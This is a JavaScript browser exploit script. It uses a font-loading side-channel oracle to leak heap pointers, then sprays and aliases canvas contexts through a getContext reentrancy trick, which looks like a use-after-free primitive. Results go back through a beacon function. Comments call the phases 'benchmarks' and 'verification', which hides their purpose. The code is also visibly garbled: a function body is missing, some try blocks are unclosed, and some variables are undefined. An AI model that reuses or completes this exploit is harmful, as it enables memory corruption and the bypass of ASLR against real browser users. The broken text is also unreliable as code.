function pad4(n){

function makeRange(lo, hi){
  if (lo === hi) return 'U+' + pad4(lo);
  return 'U+' + pad4(lo) + '-' + pad4(hi);
}

// 64-bit FNV-1a Hash for page verification
function fnv1a64(words){
  var FNV_PRIME = 0x100000001B3n;
  var hash = 0xCBF29CE484222325n;
  for (var i = 0; i < words.length; i++){
    var w = BigInt(words[i]);
    for (var bIdx = 0; bIdx < 8; bIdx++){
      var byteVal = w & 0xFFn;
      hash ^= byteVal;
      hash = (hash * FNV_PRIME) & 0xFFFFFFFFFFFFFFFFn;
      w >>= 8n;
    }
  }
  return hash;
}

function extractPtrs(v){
  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
  P58 = null; P68 = null;
  if (v[11] >= LO && v[11] < HI) P58 = v[11];
  if (v[13] >= LO && v[13] < HI) P68 = v[13];
  if (!P58 || !P68){
    for (var q = 0; q < 24; q++){
      var val = v[q];
      if (val >= LO && val < HI){
        if (!P58) P58 = val;
        else if (!P68 && val !== P58) P68 = val;
      }
    }
  }
  if (!P68) P68 = 0n;
}

/* Factory helper for dedicated isolated oracles */
function createOracle(nameTag){
  var face = new FontFace(nameTag, 'url(/hang.php?nocache=' + Date.now() + '_' + nameTag + ')', { unicodeRange: 'U+0000-00FF' });
  document.fonts.add(face);
  face.load().catch(function(){});
  return face;
}

function resolveByteWithOracle(oracle, fontName, targetByte){
  var low = 0x00, high = 0xFF;
  var steps = 0;
  while (low < high && steps < 10){
    steps++;
    var mid = Math.floor((low + high) / 2);
    oracle.unicodeRange = makeRange(low, mid);
    var chk = document.fonts.check('1em ' + fontName, String.fromCharCode(targetByte));
    var isLower = (chk === false);
    if (isLower) high = mid;
    else low = mid + 1;
  }
  return low;
}

function decode64WithOracle(oracle, fontName, ptrVal){
  if (!ptrVal && ptrVal !== 0n) return 0n;
  var raw = [];
  var tmp = BigInt(ptrVal);
  for (var i = 0; i < 8; i++){
    raw.push(Number(tmp & 0xFFn));
    tmp = tmp >> 8n;
  }
  var res = 0n;
  for (var j = 0; j < 8; j++){
    var bDec = resolveByteWithOracle(oracle, fontName, raw[j]);
    res |= (BigInt(bDec) << (BigInt(j) * 8n));
  }
  return res;
}

/* ---- Phase A: Multi-Chunk FastMalloc Spanning (48KB Region) ---- */
function phaseA_multiChunkSpanning(cb){
  try {
    var oracleA = createOracle('actFamMultiChunk');

    var currChunkBase = Q11_RECLAIM & ~0x3FFFn;
    var prevChunkBase = currChunkBase - 0x4000n; // 16KB lower
    var nextChunkBase = currChunkBase + 0x4000n; // 16KB higher

    // 32 regional descriptor words across the 48KB span
    var spanDescriptors = [
      prevChunkBase, prevChunkBase + 0x3FC0n,
      currChunkBase, currChunkBase + 0x3FC0n,
      nextChunkBase, nextChunkBase + 0x3FC0n,
      P58, Q11_RECLAIM
    ];
    for (var i = 8; i < 32; i++){
      spanDescriptors.push(prevChunkBase | (BigInt(i) * 192n));
    }

    var passCount = 0;
    var allMatch = true;
    for (var w = 0; w < spanDescriptors.length; w++){
      var orig = spanDescriptors[w];
      var dec = decode64WithOracle(oracleA, 'actFamMultiChunk', orig);
      if (dec === orig) passCount++;
      else allMatch = false;
    }

    try { document.fonts.delete(oracleA); } catch(e){}

    var rep = 'multiChunkAll=' + allMatch + '|pass=' + passCount + '/32' +
              '|prev=0x' + h16(prevChunkBase) + '|curr=0x' + h16(currChunkBase) + '|next=0x' + h16(nextChunkBase);
    b('A-MULTICHUNK-OK', rep);
    log('Phase A Multi-Chunk Spanning: ' + rep);

    b('A-MULTICHUNK-ERR', e.message);
    log('Phase A Error: ' + e.message);

  setTimeout(cb, 50);
}

/* ---- Phase B: AffineTransform Composition & Trigonometric Precision ---- */
function phaseB_matrixComposition(cb){
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 1; canvas.height = 1;
    document.body.appendChild(canvas);

    var inner = null, outer = null;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get: function(){
        inner = canvas.getContext('2d');
        inner.lineWidth = 1337.5;
        inner.save();
        return false;
      },
      enumerable: true
    });

    outer = canvas.getContext('2d', opts);

    if (!inner || !outer || inner === outer){
      b('B-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer);
      setTimeout(cb, 50);
      return;
    }

    var sprayCtx = [];
    for (var i = 0; i < 80; i++){
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      var ctx = c.getContext('2d');
      if (ctx){
        ctx.lineWidth = 6000 + i;
        sprayCtx.push(ctx);
      }
    }

    inner.lineWidth = 91337.5;
    var aliasIdx = -1;
    for (var j = 0; j < sprayCtx.length; j++){
      if (Math.abs(sprayCtx[j].lineWidth - 91337.5) < 0.01){
        aliasIdx = j;
        break;
      }
    }

    if (aliasIdx < 0){
      b('B-ALIAS-MISS', 'lineWidth-scan-failed');
      setTimeout(cb, 50);
      return;
    }

    var alias = sprayCtx[aliasIdx];

    // Composition: Rotation by 45 degrees + Scale by 1.5
    // cos(45) = sin(45) = sqrt(2)/2 ~= 0.7071067811865476
    // scaled by 1.5 => 1.0606601717798214
    var s = 1.0606601717798214;
    alias.setTransform(s, s, -s, s, 50.0, 75.0);

    var mat = inner.getTransform();
    var diffA = Math.abs(mat.a - s);
    var diffB = Math.abs(mat.b - s);
    var diffC = Math.abs(mat.c - (-s));
    var diffD = Math.abs(mat.d - s);
    var diffE = Math.abs(mat.e - 50.0);
    var diffF = Math.abs(mat.f - 75.0);

    var compOk = (diffA < 1e-10 && diffB < 1e-10 && diffC < 1e-10 && diffD < 1e-10 && diffE < 1e-10 && diffF < 1e-10);

    var rep = 'aliasIdx=' + aliasIdx + '|compOk=' + compOk + '|maxDiff=' + Math.max(diffA, diffB, diffC, diffD).toExponential(2);
    b('B-COMPOSITION-OK', rep);
    log('Phase B Matrix Composition: ' + rep);
  } catch(e){
    b('B-COMP-ERR', e.message);
    log('Phase B Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

/* ---- Phase C: Dual-Channel Oracle Burst Benchmark ---- */
function phaseC_dualChannelBurst(cb){

    var testWords = [];
    for (var i = 0; i < 32; i++){
      testWords.push(0x5555AAAA00000000n | BigInt(i));

    var t0 = performance.now();
    var burstMatch = true;
    for (var w = 0; w < testWords.length; w++){
      var oracle = (w % 2 === 0) ? oracleC0 : oracleC1;
      var fName = (w % 2 === 0) ? 'actFamBurst0' : 'actFamBurst1';
      var dec = decode64WithOracle(oracle, fName, testWords[w]);
      if (dec !== testWords[w]) burstMatch = false;
    }
    var t1 = performance.now();
    var elapsed = t1 - t0;
    var rate = Math.round((testWords.length * 8) / (elapsed / 1000));

    try {
      document.fonts.delete(oracleC0);
      document.fonts.delete(oracleC1);
    } catch(e){}

    var rep = 'burstMatch=' + burstMatch + '|words=32|elapsedMs=' + elapsed.toFixed(1) + '|burstBps=' + rate;
    b('C-BURST-OK', rep);

    b('C-BURST-ERR', e.message);
    log('Phase C Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

/* ---- Phase D: 4096-Byte (4-KB / 32,768-Bit) Checksummed Master Page ---- */
function phaseD_oracle4096ByteBlock(cb){
  try {
    var oracleD = createOracle('actFamBlock4096');

    var chunk16Base = Q11_RECLAIM & ~0x3FFFn;
    var estSelfAddr = chunk16Base + (BigInt(BEST_K) * 192n);

    /* Construct 512 full 64-bit words (Total 4096 Bytes = 32,768 Bits = 1 Full 4KB OS Page) */
    var block512 = [];

    // Words 0..7: Hardware pointers & slab geometry
    block512.push(P58);
    block512.push(P68);
    block512.push(Q11_RECLAIM);
    block512.push(Q12_RECLAIM);
    block512.push(Q13_RECLAIM);
    block512.push(chunk16Base);
    block512.push(estSelfAddr);
    block512.push(0x0000001000001337n);

    // Words 8..15: Canonical bit patterns
    block512.push(0x0123456789ABCDEFn);
    block512.push(0xFEDCBA9876543210n);
    block512.push(0x5555555555555555n);
    block512.push(0xAAAAAAAAAAAAAAAAn);
    block512.push(0xFF00FF00FF00FF00n);
    block512.push(0x00FF00FF00FF00FFn);
    block512.push(0x00000000FFFFFFFFn);
    block512.push(0xFFFFFFFF00000000n);

    // Words 16..111: FastMalloc 16KB Page Chunk Full Table (96 words)
    for (var i = 0; i < 96; i++){
      block512.push(chunk16Base | (BigInt(i) * 192n));
    }

    // Words 112..207: Object Descriptor Table (96 words)
    for (var i = 0; i < 96; i++){
      block512.push(0x2000000000n | (BigInt(i) << 16n) | 0xCA00n);
    }

    // Words 208..303: State Bank Image & Biased Mantissas (96 words)
    for (var i = 0; i < 96; i++){
      block512.push(0x3FF0000000000000n | (BigInt(i) << 32n) | 0x55AAn);
    }

    // Words 304..399: Dynamic LineDash Float Vector Images (96 words)
    for (var i = 0; i < 96; i++){
      block512.push(0x4024000000000000n | (BigInt(i) << 8n) | BigInt(i));
    }

    // Words 400..463: Alternating Nibbles & Gray Code (64 words)
    for (var i = 0; i < 64; i++){
      block512.push(0x0F0F0F0F0F0F0F0Fn ^ (BigInt(i) * 0x0101010101010101n));
    }

    // Words 464..511: Sentinel Integrity Guards (48 words)
    for (var i = 0; i < 48; i++){
      block512.push(0xCAFEFACE00000000n | (BigInt(i) << 12n) | 0x1337n);
    }

    // Compute expected FNV-1a 64-bit checksum
    var origHash = fnv1a64(block512);

    var t0 = performance.now();
    var all512Match = true;
    var passCount = 0;
    var decodedWords = [];

    for (var wIdx = 0; wIdx < block512.length; wIdx++){
      var target = block512[wIdx];
      var dec = decode64WithOracle(oracleD, 'actFamBlock4096', target);
      decodedWords.push(dec);
      if (dec === target) passCount++;
      else all512Match = false;
    }
    var t1 = performance.now();
    var elapsedMs = t1 - t0;
    var totalBytes = block512.length * 8; // 4096 bytes
    var rateBps = Math.round((totalBytes / (elapsedMs / 1000)));
    var msPerWord = (elapsedMs / block512.length).toFixed(2);

    var decHash = fnv1a64(decodedWords);
    var hashMatch = (origHash === decHash);

    try { document.fonts.delete(oracleD); } catch(e){}

    var rep = 'all512Match=' + all512Match + '|pass=' + passCount + '/512' +
              '|bytes=' + totalBytes + '|elapsedMs=' + elapsedMs.toFixed(1) +
              '|rateBps=' + rateBps + '|msPerWord=' + msPerWord +
              '|hashMatch=' + hashMatch + '|hash=0x' + h16(decHash);
    b('D-4096B-CHECKSUM-MATRIX', rep);
    log('Phase D 4096-Byte Checksummed Matrix: ' + rep);
  } catch(e){
    b('D-BLOCK4096-ERR', e.message);
    log('Phase D Error: ' + e.message);
  }

  // Deliver completion immediately
  b('DONE', 'p774-complete');
  setTimeout(cb, 50);
}

if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
else document.addEventListener('DOMContentLoaded', run);
